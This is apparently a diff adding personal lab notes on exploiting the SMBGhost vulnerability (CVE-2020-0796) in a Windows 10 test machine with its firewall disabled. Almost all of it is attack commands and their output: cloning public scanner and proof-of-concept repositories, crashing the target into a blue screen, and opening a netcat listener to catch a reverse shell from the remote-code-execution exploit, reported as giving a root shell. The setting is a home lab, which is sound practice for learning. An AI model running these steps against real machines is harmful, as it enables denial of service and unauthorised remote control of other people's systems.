@@ -1,0 +1,28 @@
+Lets do SMBGhost Vulnerability
+
+    setup: 
+        Windows 10 H1 2019 September (19H1 build 18362.356 - 2019.09) with FW disabled 
+
+
+    check if vulnerable:
+        git clone https://github.com/ButrintKomoni/cve-2020-0796
+        python3 cve-2020-0796-scanner.py 192.168.59.16
+
+            ┌──(kali㉿kali)-[/opt/cve-2020-0796]
+            └─$ python3 cve-2020-0796-scanner.py 192.168.59.16
+            Vulnerable
+
+    lets blue screen it:
+        git clone https://github.com/jiansiting/CVE-2020-0796.git
+        python3 cve-2020-0796.py 192.168.59.16
+        -> BLUE SCREEN of death!!!
+
+    lets exploit it:
+        git clone https://github.com/ZecOps/CVE-2020-0796-RCE-POC.git 
+        nc -lvp 4444
+
+        run from other windows machine: 
+            python3 SMBleedingGhost.py 192.168.59.16 192.168.59.13 4444    
+                works! got ROOT shell on port 4444
+
+    
